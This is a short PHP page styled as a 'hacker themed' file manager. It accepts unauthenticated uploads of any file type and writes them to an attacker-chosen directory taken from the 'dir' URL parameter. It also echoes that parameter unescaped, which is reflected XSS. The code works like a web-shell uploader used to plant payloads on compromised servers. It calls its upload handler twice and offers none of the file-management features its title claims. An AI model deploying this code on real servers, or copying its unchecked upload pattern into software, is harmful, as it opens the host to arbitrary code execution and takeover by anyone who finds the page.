<?php
    // Function to handle the file upload
    function handleFileUpload($uploadDir) {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['fileToUpload'])) {
            $targetDir = $uploadDir;  // Directory where files will be uploaded
            $targetFile = $targetDir . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
            $uploadOk = 1;

            // Check if file is uploaded
            if ($_FILES['fileToUpload']['error'] !== UPLOAD_ERR_OK) {
                echo "<p>Error uploading the file.</p>";
                return;
            }

            // Move the uploaded file to the destination directory
            if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile)) {
                echo "<p>The file " . htmlspecialchars(basename($_FILES['fileToUpload']['name'])) . " has been uploaded successfully!</p>";
            } else {
                echo "<p>Sorry, there was an error uploading your file.</p>";
            }
        }
    }

    // Get current directory of the PHP file
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    if (!is_dir($currentDir)) {
        echo "<p>Invalid directory: $currentDir</p>";
        exit;
    }

    // Set the directory for file uploads (one level up from current directory)
    $uploadDir = dirname($currentDir);

    // Handle file upload
    handleFileUpload($uploadDir);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker Themed File Manager</title>
    <style>
        body {
            font-family: "Courier New", monospace;
            background-color: #000;
            color: lime;
        }
        h2, h3, p, a {
            color: lime;
        }
        h2 {
            background-color: #333;
            padding: 10px;
            border: 2px solid red;
        }
        h3 {
            color: #ff0000;
        }
        a {
            color: white;
            text-decoration: none;
            font-weight: bold;
        }
        a:hover {
            color: red;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        table, th, td {
            border: 1px solid #ff0000;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: red;
            color: white;
        }
        tr:nth-child(even) {
            background-color: #333;
        }
        input[type="text"], input[type="submit"], textarea {
            background-color: #333;
            color: lime;
            border: 1px solid red;
            padding: 10px;
            margin: 10px 0;
            font-family: "Courier New", monospace;
            width: 100%;
        }
        input[type="submit"]:hover {
            background-color: red;
            cursor: pointer;
        }
        pre {
            background-color: #111;
            padding: 10px;
            border: 1px solid red;
            max-height: 300px;
            overflow: auto;
        }
        .preview-area {
            background-color: black;
            color: lime;
            padding: 20px;
            border: 2px solid red;
            margin-bottom: 20px;
        }
        form {
            margin-bottom: 20px;
        }
        .action-btn {
            padding: 5px 10px;
            color: white;
            background-color: red;
            border: none;
            cursor: pointer;
        }
        .action-btn:hover {
            background-color: lime;
            color: black;
        }
    </style>
</head>
<body>

    <h2>Hacker Themed PHP File Manager</h2>

    <form action="" method="post" enctype="multipart/form-data">
        <label for="fileToUpload">Upload File:</label><br>
        <input type="file" name="fileToUpload" id="fileToUpload" required>
        <input type="submit" value="Upload File" name="submit">
    </form>

    <?php
    // Handle file upload
    handleFileUpload($uploadDir);
    ?>

    <h3>Current Directory: <?php echo $currentDir; ?></h3>

    <!-- Add any additional file management functions like listing files, etc. -->
</body>
</html>